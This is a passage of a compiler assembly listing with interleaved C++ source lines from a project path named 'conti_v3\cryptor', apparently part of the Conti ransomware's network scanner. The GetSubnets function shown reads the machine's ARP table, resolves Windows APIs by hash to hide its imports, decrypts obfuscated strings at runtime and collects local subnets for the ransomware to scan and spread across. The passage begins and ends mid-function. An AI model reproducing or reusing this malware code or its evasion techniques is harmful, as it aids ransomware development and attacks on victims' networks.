  00402	0f b6 45 b1	 movzx	 eax, BYTE PTR $T4[rbp-255]

; 58   :         return m_isDecrypted;

  00406	0f b6 45 b0	 movzx	 eax, BYTE PTR $T4[rbp-256]

; 63   :         if (!isDecrypted())

  0040a	84 c0		 test	 al, al
  0040c	75 4d		 jne	 SHORT $LN486@GetSubnets
  0040e	66 90		 npad	 2
$LL487@GetSubnets:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00410	0f b6 4c 35 b1	 movzx	 ecx, BYTE PTR $T4[rbp+rsi-255]

; 40   :     return (a % n + n) % n;

  00415	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0041a	83 e9 65	 sub	 ecx, 101		; 00000065H
  0041d	6b c9 33	 imul	 ecx, ecx, 51		; 00000033H

; 40   :     return (a % n + n) % n;

  00420	f7 e9		 imul	 ecx
  00422	03 d1		 add	 edx, ecx
  00424	c1 fa 06	 sar	 edx, 6
  00427	8b c2		 mov	 eax, edx
  00429	c1 e8 1f	 shr	 eax, 31
  0042c	03 d0		 add	 edx, eax
  0042e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00431	2b c8		 sub	 ecx, eax
  00433	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00438	83 c1 7f	 add	 ecx, 127		; 0000007fH
  0043b	f7 e9		 imul	 ecx
  0043d	03 d1		 add	 edx, ecx
  0043f	c1 fa 06	 sar	 edx, 6
  00442	8b c2		 mov	 eax, edx
  00444	c1 e8 1f	 shr	 eax, 31
  00447	03 d0		 add	 edx, eax
  00449	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0044c	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0044e	88 4c 35 b1	 mov	 BYTE PTR $T4[rbp+rsi-255], cl
  00452	48 ff c6	 inc	 rsi
  00455	48 83 fe 50	 cmp	 rsi, 80			; 00000050H
  00459	72 b5		 jb	 SHORT $LL487@GetSubnets
$LN486@GetSubnets:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 155  : 		logs::Write(OBFW(L"GetIpNetTable fails. GetLastError = %lu"), pGetLastError());

  0045b	8b d7		 mov	 edx, edi
  0045d	48 8d 4d b1	 lea	 rcx, QWORD PTR $T4[rbp-255]
  00461	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 156  : 		free(IpNetTable);

  00466	48 8b cb	 mov	 rcx, rbx
  00469	e8 00 00 00 00	 call	 free
$LN559@GetSubnets:

; 157  : 		return FALSE;

  0046e	33 c0		 xor	 eax, eax
  00470	e9 c2 03 00 00	 jmp	 $LN555@GetSubnets
$LN13@GetSubnets:
  00475	4c 89 a4 24 b0
	01 00 00	 mov	 QWORD PTR [rsp+432], r12

; 158  : 
; 159  : 	}
; 160  : 
; 161  : 	for (ULONG i = 0; i < IpNetTable->dwNumEntries; i++) {

  0047d	44 8b e6	 mov	 r12d, esi
  00480	39 33		 cmp	 DWORD PTR [rbx], esi
  00482	0f 86 9a 03 00
	00		 jbe	 $LN532@GetSubnets
  00488	4c 89 ac 24 b8
	01 00 00	 mov	 QWORD PTR [rsp+440], r13
  00490	4c 89 b4 24 78
	01 00 00	 mov	 QWORD PTR [rsp+376], r14
  00498	4c 89 bc 24 70
	01 00 00	 mov	 QWORD PTR [rsp+368], r15
$LL4@GetSubnets:

; 164  : 		ULONG dwAddress = IpNetTable->table[i].dwAddr;	

  004a0	41 8b c4	 mov	 eax, r12d
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  004a3	48 8d 7d 30	 lea	 rdi, QWORD PTR wszIpAddress$12[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1290 : 	pFunction = (char*(WINAPI*)(in_addr))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x464a1063, 2);

  004a7	41 b8 63 10 4a
	46		 mov	 r8d, 1179258979		; 464a1063H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 164  : 		ULONG dwAddress = IpNetTable->table[i].dwAddr;	

  004ad	48 8d 0c 40	 lea	 rcx, QWORD PTR [rax+rax*2]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  004b1	33 c0		 xor	 eax, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 164  : 		ULONG dwAddress = IpNetTable->table[i].dwAddr;	

  004b3	8b 5c cb 14	 mov	 ebx, DWORD PTR [rbx+rcx*8+20]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  004b7	b9 2c 00 00 00	 mov	 ecx, 44			; 0000002cH
  004bc	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1290 : 	pFunction = (char*(WINAPI*)(in_addr))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x464a1063, 2);

  004be	8d 50 15	 lea	 edx, QWORD PTR [rax+21]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 164  : 		ULONG dwAddress = IpNetTable->table[i].dwAddr;	

  004c1	89 5d 24	 mov	 DWORD PTR dwAddress$10[rbp-256], ebx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1290 : 	pFunction = (char*(WINAPI*)(in_addr))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x464a1063, 2);

  004c4	44 8d 48 02	 lea	 r9d, QWORD PTR [rax+2]
  004c8	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  004cd	8b cb		 mov	 ecx, ebx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1291 : 	return pFunction(in);

  004cf	ff d0		 call	 rax
  004d1	48 8b d8	 mov	 rbx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 173  : 		DWORD le = WSAGetLastError();

  004d4	ff 15 00 00 00
	00		 call	 QWORD PTR __imp_WSAGetLastError
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  004da	40 88 74 24 28	 mov	 BYTE PTR $T5[rsp], sil
  004df	c6 44 24 29 73	 mov	 BYTE PTR $T5[rsp+1], 115 ; 00000073H
  004e4	c6 44 24 2a 1e	 mov	 BYTE PTR $T5[rsp+2], 30
  004e9	c6 44 24 2b 7a	 mov	 BYTE PTR $T5[rsp+3], 122 ; 0000007aH
  004ee	c6 44 24 2c 5e	 mov	 BYTE PTR $T5[rsp+4], 94	; 0000005eH
  004f3	c6 44 24 2d 1a	 mov	 BYTE PTR $T5[rsp+5], 26
  004f8	0f b6 4c 24 29	 movzx	 ecx, BYTE PTR $T5[rsp+1]

; 58   :         return m_isDecrypted;

  004fd	0f b6 4c 24 28	 movzx	 ecx, BYTE PTR $T5[rsp]

; 63   :         if (!isDecrypted())

  00502	84 c9		 test	 cl, cl
  00504	75 5b		 jne	 SHORT $LN44@GetSubnets

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00506	48 8b fe	 mov	 rdi, rsi
  00509	0f 1f 80 00 00
	00 00		 npad	 7
$LL45@GetSubnets:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00510	0f b6 4c 3c 29	 movzx	 ecx, BYTE PTR $T5[rsp+rdi+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00515	b8 1a 00 00 00	 mov	 eax, 26
  0051a	2b c1		 sub	 eax, ecx
  0051c	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  0051f	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00524	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00526	f7 e9		 imul	 ecx
  00528	03 d1		 add	 edx, ecx
  0052a	c1 fa 06	 sar	 edx, 6
  0052d	8b c2		 mov	 eax, edx
  0052f	c1 e8 1f	 shr	 eax, 31
  00532	03 d0		 add	 edx, eax
  00534	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00537	2b c8		 sub	 ecx, eax
  00539	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0053e	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00541	f7 e9		 imul	 ecx
  00543	03 d1		 add	 edx, ecx
  00545	c1 fa 06	 sar	 edx, 6
  00548	8b c2		 mov	 eax, edx
  0054a	c1 e8 1f	 shr	 eax, 31
  0054d	03 d0		 add	 edx, eax
  0054f	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00552	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00554	88 4c 3c 29	 mov	 BYTE PTR $T5[rsp+rdi+1], cl
  00558	48 ff c7	 inc	 rdi
  0055b	48 83 ff 05	 cmp	 rdi, 5
  0055f	72 af		 jb	 SHORT $LL45@GetSubnets
$LN44@GetSubnets:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 996  : 	pFunction = (PCSTR(WINAPI*)(PCSTR, PCSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0x4c07f7e3, 24);//GetProcAddress(hShlwapi, OBFA("StrStrIA"));

  00561	ba 16 00 00 00	 mov	 edx, 22
  00566	41 b8 e3 f7 07
	4c		 mov	 r8d, 1275590627		; 4c07f7e3H
  0056c	44 8d 4a 02	 lea	 r9d, QWORD PTR [rdx+2]
  00570	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 997  : 	return pFunction(pszFirst, pszSrch);

  00575	48 8d 54 24 29	 lea	 rdx, QWORD PTR $T5[rsp+1]
  0057a	48 8b cb	 mov	 rcx, rbx
  0057d	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0057f	40 88 74 24 38	 mov	 BYTE PTR $T6[rsp], sil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 997  : 	return pFunction(pszFirst, pszSrch);

  00584	4c 8b e8	 mov	 r13, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00587	c6 44 24 39 59	 mov	 BYTE PTR $T6[rsp+1], 89	; 00000059H
  0058c	c6 44 24 3a 13	 mov	 BYTE PTR $T6[rsp+2], 19
  00591	c6 44 24 3b 70	 mov	 BYTE PTR $T6[rsp+3], 112 ; 00000070H
  00596	c6 44 24 3c 14	 mov	 BYTE PTR $T6[rsp+4], 20
  0059b	c6 44 24 3d 59	 mov	 BYTE PTR $T6[rsp+5], 89	; 00000059H
  005a0	c6 44 24 3e 4d	 mov	 BYTE PTR $T6[rsp+6], 77	; 0000004dH
  005a5	c6 44 24 3f 7b	 mov	 BYTE PTR $T6[rsp+7], 123 ; 0000007bH
  005aa	c6 44 24 40 14	 mov	 BYTE PTR $T6[rsp+8], 20
  005af	c6 44 24 41 69	 mov	 BYTE PTR $T6[rsp+9], 105 ; 00000069H
  005b4	0f b6 4c 24 39	 movzx	 ecx, BYTE PTR $T6[rsp+1]

; 58   :         return m_isDecrypted;

  005b9	0f b6 4c 24 38	 movzx	 ecx, BYTE PTR $T6[rsp]

; 63   :         if (!isDecrypted())

  005be	84 c9		 test	 cl, cl
  005c0	75 5d		 jne	 SHORT $LN78@GetSubnets

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  005c2	48 8b fe	 mov	 rdi, rsi
  005c5	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL79@GetSubnets:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  005d0	0f b6 4c 3c 39	 movzx	 ecx, BYTE PTR $T6[rsp+rdi+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  005d5	b8 69 00 00 00	 mov	 eax, 105		; 00000069H
  005da	2b c1		 sub	 eax, ecx
  005dc	6b c8 0b	 imul	 ecx, eax, 11

; 40   :     return (a % n + n) % n;

  005df	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  005e4	f7 e9		 imul	 ecx
  005e6	03 d1		 add	 edx, ecx
  005e8	c1 fa 06	 sar	 edx, 6
  005eb	8b c2		 mov	 eax, edx
  005ed	c1 e8 1f	 shr	 eax, 31
  005f0	03 d0		 add	 edx, eax
  005f2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  005f5	2b c8		 sub	 ecx, eax
  005f7	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  005fc	83 c1 7f	 add	 ecx, 127		; 0000007fH
  005ff	f7 e9		 imul	 ecx
  00601	03 d1		 add	 edx, ecx
  00603	c1 fa 06	 sar	 edx, 6
  00606	8b c2		 mov	 eax, edx
  00608	c1 e8 1f	 shr	 eax, 31
  0060b	03 d0		 add	 edx, eax
  0060d	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00610	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00612	88 4c 3c 39	 mov	 BYTE PTR $T6[rsp+rdi+1], cl
  00616	48 ff c7	 inc	 rdi
  00619	48 83 ff 09	 cmp	 rdi, 9
  0061d	72 b1		 jb	 SHORT $LL79@GetSubnets
$LN78@GetSubnets:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 996  : 	pFunction = (PCSTR(WINAPI*)(PCSTR, PCSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0x4c07f7e3, 24);//GetProcAddress(hShlwapi, OBFA("StrStrIA"));

  0061f	ba 16 00 00 00	 mov	 edx, 22
  00624	41 b8 e3 f7 07
	4c		 mov	 r8d, 1275590627		; 4c07f7e3H
  0062a	44 8d 4a 02	 lea	 r9d, QWORD PTR [rdx+2]
  0062e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 997  : 	return pFunction(pszFirst, pszSrch);

  00633	48 8d 54 24 39	 lea	 rdx, QWORD PTR $T6[rsp+1]
  00638	48 8b cb	 mov	 rcx, rbx
  0063b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0063d	40 88 74 24 20	 mov	 BYTE PTR $T7[rsp], sil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 997  : 	return pFunction(pszFirst, pszSrch);

  00642	4c 8b f8	 mov	 r15, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00645	c6 44 24 21 4e	 mov	 BYTE PTR $T7[rsp+1], 78	; 0000004eH
  0064a	c6 44 24 22 5c	 mov	 BYTE PTR $T7[rsp+2], 92	; 0000005cH
  0064f	c6 44 24 23 78	 mov	 BYTE PTR $T7[rsp+3], 120 ; 00000078H
  00654	c6 44 24 24 02	 mov	 BYTE PTR $T7[rsp+4], 2
  00659	0f b6 4c 24 21	 movzx	 ecx, BYTE PTR $T7[rsp+1]

; 58   :         return m_isDecrypted;

  0065e	0f b6 4c 24 20	 movzx	 ecx, BYTE PTR $T7[rsp]

; 63   :         if (!isDecrypted())

  00663	84 c9		 test	 cl, cl
  00665	75 54		 jne	 SHORT $LN102@GetSubnets

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00667	48 8b fe	 mov	 rdi, rsi
  0066a	66 0f 1f 44 00
	00		 npad	 6
$LL103@GetSubnets:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00670	0f b6 4c 3c 21	 movzx	 ecx, BYTE PTR $T7[rsp+rdi+1]

; 40   :     return (a % n + n) % n;

  00675	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0067a	83 e9 02	 sub	 ecx, 2
  0067d	8d 0c c9	 lea	 ecx, DWORD PTR [rcx+rcx*8]

; 40   :     return (a % n + n) % n;

  00680	f7 e9		 imul	 ecx
  00682	03 d1		 add	 edx, ecx
  00684	c1 fa 06	 sar	 edx, 6
  00687	8b c2		 mov	 eax, edx
  00689	c1 e8 1f	 shr	 eax, 31
  0068c	03 d0		 add	 edx, eax
  0068e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00691	2b c8		 sub	 ecx, eax
  00693	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00698	83 c1 7f	 add	 ecx, 127		; 0000007fH
  0069b	f7 e9		 imul	 ecx
  0069d	03 d1		 add	 edx, ecx
  0069f	c1 fa 06	 sar	 edx, 6
  006a2	8b c2		 mov	 eax, edx
  006a4	c1 e8 1f	 shr	 eax, 31
  006a7	03 d0		 add	 edx, eax
  006a9	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  006ac	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  006ae	88 4c 3c 21	 mov	 BYTE PTR $T7[rsp+rdi+1], cl
  006b2	48 ff c7	 inc	 rdi
  006b5	48 83 ff 04	 cmp	 rdi, 4
  006b9	72 b5		 jb	 SHORT $LL103@GetSubnets
$LN102@GetSubnets:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 996  : 	pFunction = (PCSTR(WINAPI*)(PCSTR, PCSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0x4c07f7e3, 24);//GetProcAddress(hShlwapi, OBFA("StrStrIA"));

  006bb	ba 16 00 00 00	 mov	 edx, 22
  006c0	41 b8 e3 f7 07
	4c		 mov	 r8d, 1275590627		; 4c07f7e3H
  006c6	44 8d 4a 02	 lea	 r9d, QWORD PTR [rdx+2]
  006ca	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 997  : 	return pFunction(pszFirst, pszSrch);

  006cf	48 8d 54 24 21	 lea	 rdx, QWORD PTR $T7[rsp+1]
  006d4	48 8b cb	 mov	 rcx, rbx
  006d7	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  006d9	40 88 74 24 30	 mov	 BYTE PTR $T8[rsp], sil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 997  : 	return pFunction(pszFirst, pszSrch);

  006de	4c 8b f0	 mov	 r14, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  006e1	c6 44 24 31 41	 mov	 BYTE PTR $T8[rsp+1], 65	; 00000041H
  006e6	c6 44 24 32 2a	 mov	 BYTE PTR $T8[rsp+2], 42	; 0000002aH
  006eb	c6 44 24 33 4f	 mov	 BYTE PTR $T8[rsp+3], 79	; 0000004fH
  006f0	c6 44 24 34 1c	 mov	 BYTE PTR $T8[rsp+4], 28
  006f5	c6 44 24 35 0b	 mov	 BYTE PTR $T8[rsp+5], 11
  006fa	0f b6 4c 24 31	 movzx	 ecx, BYTE PTR $T8[rsp+1]

; 58   :         return m_isDecrypted;

  006ff	0f b6 4c 24 30	 movzx	 ecx, BYTE PTR $T8[rsp]

; 63   :         if (!isDecrypted())

  00704	84 c9		 test	 cl, cl
  00706	75 53		 jne	 SHORT $LN128@GetSubnets

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00708	48 8b fe	 mov	 rdi, rsi
  0070b	0f 1f 44 00 00	 npad	 5
$LL129@GetSubnets:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00710	0f b6 4c 3c 31	 movzx	 ecx, BYTE PTR $T8[rsp+rdi+1]

; 40   :     return (a % n + n) % n;

  00715	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0071a	83 e9 0b	 sub	 ecx, 11
  0071d	6b c9 37	 imul	 ecx, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00720	f7 e9		 imul	 ecx
  00722	03 d1		 add	 edx, ecx
  00724	c1 fa 06	 sar	 edx, 6
  00727	8b c2		 mov	 eax, edx
  00729	c1 e8 1f	 shr	 eax, 31
  0072c	03 d0		 add	 edx, eax
  0072e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00731	2b c8		 sub	 ecx, eax
  00733	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00738	83 c1 7f	 add	 ecx, 127		; 0000007fH
  0073b	f7 e9		 imul	 ecx
  0073d	03 d1		 add	 edx, ecx
  0073f	c1 fa 06	 sar	 edx, 6
  00742	8b c2		 mov	 eax, edx
  00744	c1 e8 1f	 shr	 eax, 31
  00747	03 d0		 add	 edx, eax
  00749	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0074c	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0074e	88 4c 3c 31	 mov	 BYTE PTR $T8[rsp+rdi+1], cl
  00752	48 ff c7	 inc	 rdi
  00755	48 83 ff 05	 cmp	 rdi, 5
  00759	72 b5		 jb	 SHORT $LL129@GetSubnets
$LN128@GetSubnets:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 996  : 	pFunction = (PCSTR(WINAPI*)(PCSTR, PCSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0x4c07f7e3, 24);//GetProcAddress(hShlwapi, OBFA("StrStrIA"));

  0075b	ba 16 00 00 00	 mov	 edx, 22
  00760	41 b8 e3 f7 07
	4c		 mov	 r8d, 1275590627		; 4c07f7e3H
  00766	44 8d 4a 02	 lea	 r9d, QWORD PTR [rdx+2]
  0076a	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 997  : 	return pFunction(pszFirst, pszSrch);

  0076f	48 8d 54 24 31	 lea	 rdx, QWORD PTR $T8[rsp+1]
  00774	48 8b cb	 mov	 rcx, rbx
  00777	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 182  : 			p3 == szIpAddress ||

  00779	4c 3b eb	 cmp	 r13, rbx
  0077c	74 0f		 je	 SHORT $LN15@GetSubnets
  0077e	4c 3b fb	 cmp	 r15, rbx
  00781	74 0a		 je	 SHORT $LN15@GetSubnets
  00783	4c 3b f3	 cmp	 r14, rbx
  00786	74 05		 je	 SHORT $LN15@GetSubnets
  00788	48 3b c3	 cmp	 rax, rbx
  0078b	75 67		 jne	 SHORT $LN9@GetSubnets
$LN15@GetSubnets:

; 183  : 			p4 == szIpAddress)
; 184  : 		{
; 185  : 
; 186  : 			BOOL Found = FALSE;
; 187  : 
; 188  : 			PSUBNET_INFO SubnetInfo = NULL;
; 189  : 			TAILQ_FOREACH(SubnetInfo, SubnetList, Entries) {

  0078d	4c 8b 75 18	 mov	 r14, QWORD PTR SubnetList$GSCopy$1$[rbp-256]
  00791	8b 4d 24	 mov	 ecx, DWORD PTR dwAddress$10[rbp-256]
  00794	49 8b 06	 mov	 rax, QWORD PTR [r14]
  00797	48 85 c0	 test	 rax, rax
  0079a	74 17		 je	 SHORT $LN530@GetSubnets
  0079c	0f b6 55 26	 movzx	 edx, BYTE PTR dwAddress$10[rbp-254]
$LL7@GetSubnets:

; 190  : 
; 191  : 				if (!memcmp(&SubnetInfo->dwAddress, &dwAddress, 3)) {

  007a0	66 39 08	 cmp	 WORD PTR [rax], cx
  007a3	75 05		 jne	 SHORT $LN531@GetSubnets
  007a5	38 50 02	 cmp	 BYTE PTR [rax+2], dl
  007a8	74 4a		 je	 SHORT $LN9@GetSubnets
$LN531@GetSubnets:

; 183  : 			p4 == szIpAddress)
; 184  : 		{
; 185  : 
; 186  : 			BOOL Found = FALSE;
; 187  : 
; 188  : 			PSUBNET_INFO SubnetInfo = NULL;
; 189  : 			TAILQ_FOREACH(SubnetInfo, SubnetList, Entries) {

  007aa	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  007ae	48 85 c0	 test	 rax, rax
  007b1	75 ed		 jne	 SHORT $LL7@GetSubnets
$LN530@GetSubnets:

; 192  : 
; 193  : 					Found = TRUE;
; 194  : 					break;
; 195  : 
; 196  : 				}
; 197  : 
; 198  : 			}
; 199  : 			
; 200  : 			if (!Found) {
; 201  : 
; 202  : 				BYTE bAddres[4];
; 203  : 				*(ULONG*)bAddres = dwAddress;

  007b3	89 4d 28	 mov	 DWORD PTR bAddres$11[rbp-256], ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  007b6	b9 18 00 00 00	 mov	 ecx, 24
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 204  : 				bAddres[3] = 0;

  007bb	40 88 75 2b	 mov	 BYTE PTR bAddres$11[rbp-253], sil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  007bf	e8 00 00 00 00	 call	 malloc
  007c4	48 8b d0	 mov	 rdx, rax
  007c7	0f 57 c0	 xorps	 xmm0, xmm0

; 6    : 	memset(mem, 0, Size);

  007ca	33 c0		 xor	 eax, eax
  007cc	0f 11 02	 movups	 XMMWORD PTR [rdx], xmm0
  007cf	48 89 42 10	 mov	 QWORD PTR [rdx+16], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 207  : 				if (!NewSubnet) {

  007d3	48 85 d2	 test	 rdx, rdx
  007d6	74 2e		 je	 SHORT $LN533@GetSubnets

; 208  : 					break;
; 209  : 				}
; 210  : 
; 211  : 				RtlCopyMemory(&NewSubnet->dwAddress, bAddres, 4);

  007d8	8b 4d 28	 mov	 ecx, DWORD PTR bAddres$11[rbp-256]
  007db	89 0a		 mov	 DWORD PTR [rdx], ecx

; 212  : 				TAILQ_INSERT_TAIL(SubnetList, NewSubnet, Entries);

  007dd	49 8b 4e 08	 mov	 rcx, QWORD PTR [r14+8]
  007e1	48 89 4a 10	 mov	 QWORD PTR [rdx+16], rcx
  007e5	49 8b 46 08	 mov	 rax, QWORD PTR [r14+8]
  007e9	48 89 10	 mov	 QWORD PTR [rax], rdx
  007ec	48 8d 42 08	 lea	 rax, QWORD PTR [rdx+8]
  007f0	49 89 46 08	 mov	 QWORD PTR [r14+8], rax
$LN9@GetSubnets:

; 158  : 
; 159  : 	}
; 160  : 
; 161  : 	for (ULONG i = 0; i < IpNetTable->dwNumEntries; i++) {

  007f4	48 8b 5d 10	 mov	 rbx, QWORD PTR mem$1$[rbp-256]
  007f8	41 ff c4	 inc	 r12d
  007fb	44 3b 23	 cmp	 r12d, DWORD PTR [rbx]
  007fe	0f 82 9c fc ff
	ff		 jb	 $LL4@GetSubnets

; 207  : 				if (!NewSubnet) {

  00804	eb 04		 jmp	 SHORT $LN558@GetSubnets
$LN533@GetSubnets:
  00806	48 8b 5d 10	 mov	 rbx, QWORD PTR mem$1$[rbp-256]
$LN558@GetSubnets:
  0080a	4c 8b b4 24 78
	01 00 00	 mov	 r14, QWORD PTR [rsp+376]
  00812	4c 8b ac 24 b8
	01 00 00	 mov	 r13, QWORD PTR [rsp+440]
  0081a	4c 8b bc 24 70
	01 00 00	 mov	 r15, QWORD PTR [rsp+368]
$LN532@GetSubnets:

; 213  : 
; 214  : 			}
; 215  : 
; 216  : 		}
; 217  : 	}
; 218  : 
; 219  : 	free(IpNetTable);

  00822	48 8b cb	 mov	 rcx, rbx
  00825	e8 00 00 00 00	 call	 free

; 220  : 	return TRUE;

  0082a	4c 8b a4 24 b0
	01 00 00	 mov	 r12, QWORD PTR [rsp+432]
  00832	b8 01 00 00 00	 mov	 eax, 1
$LN555@GetSubnets:
  00837	48 8b 9c 24 a8
	01 00 00	 mov	 rbx, QWORD PTR [rsp+424]
$LN1@GetSubnets:

; 221  : }

  0083f	48 8b 4d 60	 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  00843	48 33 cc	 xor	 rcx, rsp
  00846	e8 00 00 00 00	 call	 __security_check_cookie
  0084b	48 81 c4 80 01
	00 00		 add	 rsp, 384		; 00000180H
  00852	5f		 pop	 rdi
  00853	5e		 pop	 rsi
  00854	5d		 pop	 rbp
